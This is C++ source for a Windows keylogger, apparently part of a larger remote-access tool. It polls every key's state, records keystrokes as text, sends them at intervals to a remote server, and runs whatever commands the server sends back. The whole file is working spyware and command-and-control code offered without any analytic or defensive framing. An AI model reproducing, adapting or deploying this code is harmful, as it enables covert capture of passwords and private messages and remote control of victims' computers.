#include "stdafx.h"
#include "Command_screenshot.h"
#include "Keylogger.h"
#include "Network.h"
#include "Settings.h"
#include "Util.h"

Keylogger keylogger;

const TCHAR* X = ((PTCHAR)~0);

// http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
const TCHAR* keyStrings[] =
{
/* 0 */ 0, 0, 0, 0, 0, 0, 0, 0, _T("[Back]"), _T("[Tab]"), 0, 0, _T("[Clear]"), _T("[Enter]"), 0, 0,
/* 1 */ _T("[Shift]"), _T("[Ctrl]"), _T("[Alt]"), _T("[Pause]"), _T("[CAPS]"), 0, 0, 0, 0, 0, 0, _T("[Esc]"), 0, 0, 0, 0,
/* 2 */ _T(" "), _T("[PgUp]"), _T("[PgDown]"), _T("[End]"), _T("[Home]"), _T("[<]"), _T("[^]"), _T("[>]"), _T("[v]"), _T("[Select]"), _T("[Print]"), _T("[Execute]"), _T("[PrintScreen]"), _T("[Ins]"), _T("[Del]"), _T("[Help]"),
/* 3 */ X, X, X, X, X, X, X, X, X, X, 0, 0, 0, 0, 0, 0,
/* 4 */ 0, X, X, X, X, X, X, X, X, X, X, X, X, X, X, X,
/* 5 */ X, X, X, X, X, X, X, X, X, X, X, _T("[LWin]"), _T("[RWin]"), _T("[Apps]"), 0, _T("[Sleep]"),
/* 6 */ X, X, X, X, X, X, X, X, X, X, _T("*"), _T("+"), 0, _T("-"), _T("."), _T("/"),
/* 7 */ _T("[F1]"), _T("[F2]"), _T("[F3]"), _T("[F4]"), _T("[F5]"), _T("[F6]"), _T("[F7]"), _T("[F8]"), _T("[F9]"), _T("[F10]"), _T("[F11]"), _T("[F12]"), _T("[F13]"), _T("[F14]"), _T("[F15]"), _T("[F16]"),
/* 8 */ _T("[F17]"), _T("[F18]"), _T("[F19]"), _T("[F20]"), _T("[F21]"), _T("[F22]"), _T("[F23]"), _T("[F24]"), 0, 0, 0, 0, 0, 0, 0, 0,
/* 9 */ _T("[NumLock]"), _T("[ScrollLock]"), X, X, X, X, X, 0, 0, 0, 0, 0, 0, 0, 0, 0,
/* A */ 0, 0, 0, 0, 0, 0, _T("[BBack]"), _T("[BForward]"), _T("[BRefresh]"), _T("[BStop]"), _T("[BSearch]"), _T("[BFavorites]"), _T("[BHome]"), _T("[VolMute]"), _T("[VolDown]"), _T("[VolUp]"),
/* B */ _T("[MNext]"), _T("[MPrev]"), _T("[MStop]"), _T("[MPlayPause]"), _T("[LaunchMail]"), _T("LaunchSelect"), _T("[LaunchApp1]"), _T("[LaunchApp2]"), 0, 0, X, X, X, X, X, X,
/* C */ X, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, X, X, X, X, X,
/* D */ 0, X, X, X, X, 0, X, 0, 0, X, X, X, X, X, X, X,
/* E */ X, X, X, X, X, X, 0, 0, 0, X, X, X, X, X, X, X,
/* F */ X, X, X, X, X, X, _T("[Attn]"), _T("[CrSel]"), _T("[ExSel]"), _T("[EraseEOF]"), _T("[Play]"), _T("[Zoom]"), 0, _T("[PA1]"), _T("[Clear]"), 0,
/*      0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F */
};

Keylogger::Keylogger() : shouldStop(false), sendInterval(V_SEND_INTERVAL_MIN)
{
	memset(keysActive, false, sizeof(keysActive));
	memset(keyBuf, 0, sizeof(keyBuf));
}
Keylogger::~Keylogger()
{

}

void Keylogger::Run()
{
	DWORD ticksLast = GetTickCount();

	for (;;)
	{
		Sleep(V_IDLE_TIME);

		if (GetTickCount() - ticksLast >= this->sendInterval)
		{
			this->Send();
			keysPressed.clear();

			if (this->shouldStop)
				break;

			ticksLast = GetTickCount();
		}

		for(int i = 0; i <= 256; i++)
		{
			this->CheckKey(i);
		}
	}
}
void Keylogger::Stop()
{
	this->shouldStop = true;
}

void Keylogger::CheckKey(short i)
{
	SHORT state = GetAsyncKeyState(i);
	BOOL keyPrev = keysActive[i];
	keysActive[i] = (state >> 8);

	if (!keyPrev && keysActive[i])
	{
		const TCHAR* str = keyStrings[i];
		
		if (str == X)
		{
			int ret = ToUnicode(i, 0, this->keysActive, keyBuf, sizeof(keyBuf), 0);
			if (ret > 0) {
				keysPressed.push_back(Util::ws2t(keyBuf));
			}
		}
		else if (str)
		{
			keysPressed.push_back(str);
		}
	}
}

void Keylogger::Send()
{
	std::tstring msgText = _T("d=");

	std::vector<std::tstring>::const_iterator itr;
	for (   itr = keysPressed.begin();
			itr != keysPressed.end();
			itr++)
	{
		msgText.append(*itr);
	}
	
	size_t resp_len;
	char *resp;
	bool ret = network.SendAndGetText(V_NET_FILE_DATA, Util::t2s(msgText).c_str(), &resp_len, &resp);

	if (ret && resp_len > 0)
	{
		this->IncreaseSendInterval();

		cmd.Run(Util::s2t(std::string(resp, resp_len)));
	}
	else
	{
		this->DecreaseSendInterval();
	}

	if (ret) free(resp);
}

void Keylogger::IncreaseSendInterval()
{
	this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 2);
}
void Keylogger::DecreaseSendInterval()
{
	this->sendInterval = min(V_SEND_INTERVAL_MAX, this->sendInterval * 20 / 19);
}